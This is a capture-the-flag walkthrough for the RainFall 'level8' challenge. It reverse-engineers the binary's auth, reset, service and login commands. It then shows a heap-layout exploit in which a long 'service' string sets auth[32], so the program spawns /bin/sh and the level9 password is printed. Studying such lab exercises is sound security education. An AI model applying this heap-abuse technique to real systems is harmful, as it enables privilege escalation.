# Level8

## Objective

The goal of Level 9 is to escalate from `level8` to `level9` by abusing how the `level8` binary manages heap allocations. By carefully using the available commands (`auth`, `reset`, `service`, and `login`), we can trigger the program to call `system("/bin/sh")` and gain a shell.

---

## Step 1: Examine the Binary

After switching to `level8`
Running the binary:

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
hello
(nil), (nil)
```

when we use ltrace we can see a printf()
```bash
printf(%p, %p\n, (nil), (nil)(nil), (nil)) = 14;
```

Input is read with `fgets()`.

then we can try to use get variables,

```bash
(gdb) info variables
All defined variables:
Non-debugging symbols:

0x08049aac  auth
0x08049ab0  service

```
Here we can see that there's two variables and theirs adresses. 
The printf  prints two pointers `(auth, service)`, both initially `nil`.
they're read by fgets and stocked in locol memory at 0x20%esp
---

## Step 2: Reverse Engineer the Commands

Disassembly of `main()` reveals 4 comparaisons to adresses that can be read like this (this is the first one) :

```bash
0x080485b5 <+81>:	je     0x804872c <main+456>
   0x080485bb <+87>:	lea    0x20(%esp),%eax
   0x080485bf <+91>:	mov    %eax,%edx
   0x080485c1 <+93>:	mov    $0x8048819,%eax
   0x080485c6 <+98>:	mov    $0x5,%ecx
   0x080485cb <+103>:	mov    %edx,%esi
   0x080485cd <+105>:	mov    %eax,%edi
   0x080485cf <+107>:	repz cmpsb %es:(%edi),%ds:(%esi)


```
<+87><+91>The part of the main says that 0x20(%esp) refers to fgets() (stdin), then this address is copied in EDX
<+93>After that we load 0x8048819 (using gdb x/s we read `auth` for this address) in EAX,
<+98>ECX is set to 5 (its the number max of caracter comparisons).
<+103><+105> setting registers for cmpsb, ESI is the entry, EDI is the auth string.
<+107> Is similar to strncmp() function, it comp byte by byte the pointed string ESI (input user) and the EDI one ("auth")

Its done for four string and each on them has functionsstarting if the comparison is good.

* `auth <data>` → calls `malloc(4)` and `strcpy()` into the global `auth` pointer.
> Here an object is created and stockes the stdin 
* `reset` → frees the `auth` pointer.
* `service <data>` → calls `strdup()` and copies into the global `service` pointer.
* `login` → if `auth[32] != 0`, it calls `system("/bin/sh")`. Otherwise, it calls `fwrite()`.
> Checks is there's somthing at the ofset, if so it runs the exec syscall.

Thus, the game plan is to get `auth[32]` set to something non-zero.

---

## Step 3: Heap Behavior

Heap allocations are sequential in memory. Testing shows:

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
```

Here `auth` is at `0x804a008` and `service` is exactly 16 bytes later. With padding, we can arrange things so that writing into `service` overflows into `auth[32]`.

---

## Step 4: Exploit Strategy

**SolutionSingle `service` overflow:**

* Create `auth` → allocates 4 bytes.
* Create `service` with a payload long enough to cover the 16-byte padding and reach `auth+32`.

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
serviceabcdefgehijklmno
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

**End of Level8 Walkthrough**
